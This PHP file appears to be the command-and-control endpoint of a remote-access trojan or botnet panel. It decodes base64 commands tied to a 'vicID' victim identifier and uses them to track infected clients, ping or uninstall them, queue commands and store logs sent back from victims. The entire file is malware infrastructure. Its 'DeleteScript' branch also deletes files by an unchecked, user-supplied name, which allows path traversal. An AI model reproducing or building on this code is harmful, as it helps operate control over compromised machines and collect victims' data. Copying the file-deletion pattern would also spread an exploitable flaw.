<?php
include_once 'classes/Database.php';
include_once 'classes/Clients.php';
$client = new Clients;
$_GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
$command = base64_decode($_GET['command']);
$ID = "'".base64_decode($_GET['vicID'])."'";
$data = $client->getClient(trim($ID,"'"));

$A = explode("|BN|", sanitizeInput($command));

switch ($A[0]) {
	case "Uninstall":
          $client->removeClient($ID);
		break;

	case "CleanCommands":
          $client->updateCommands($ID,base64_encode("Ping"));
		break;
		
	case "Offline":
          $client->updateStatus($ID,"Offline");
		break;

	case "Online":
		  $client->updateStatus($ID,"Online");
		break;
		
	case 'Ping':
		$client->updateCommands($ID,"Ping");
		$client->pinged($ID,$data->pings);
		break;

	case 'DeleteScript':
		 try {
		 	unlink("scripts/" . $A[1]);
		 } catch (Exception $e) {
		 	
		 }
		break;
	case "NewLog":
		$client->new_log(trim($ID,"'"),$A[1],$A[2]);
		break;
	default:
		break;
}

function sanitizeInput($value){
   $data = trim($value);
   $data = strip_tags($data);
   $data = htmlentities($data);
   $data = htmlspecialchars($data,ENT_QUOTES,'UTF-8');
   $data = filter_var($data,FILTER_SANITIZE_STRING);
   return $data;
}
?>
